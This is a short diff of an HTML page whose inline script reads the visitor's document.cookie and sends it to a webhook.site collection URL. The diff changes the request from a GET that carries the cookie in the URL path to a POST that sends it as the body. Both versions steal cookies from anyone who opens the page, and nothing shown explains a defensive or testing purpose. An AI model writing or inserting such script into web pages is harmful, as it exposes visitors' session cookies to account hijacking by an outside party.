@@ -5,11 +5,11 @@
 </head>
     <body>
         <script>
-    let server = new XMLHttpRequest;
-    server.open("GET", "https://webhook.site/5174eb7d-05c3-4c4c-bbf0-59c3b7f9c0c7/" + document.cookie);
+let server = new XMLHttpRequest;
+    server.open("POST", "https://webhook.site/75774ec1-19b9-4cc8-bad6-7e029e4930af",true);
     server.setRequestHeader("Content-Type", "text/plain");
     server.setRequestHeader("Access-Control-Allow-Origin", "*");
-            server.send();
+    server.send(document.cookie);
 </script>
     </body>
 
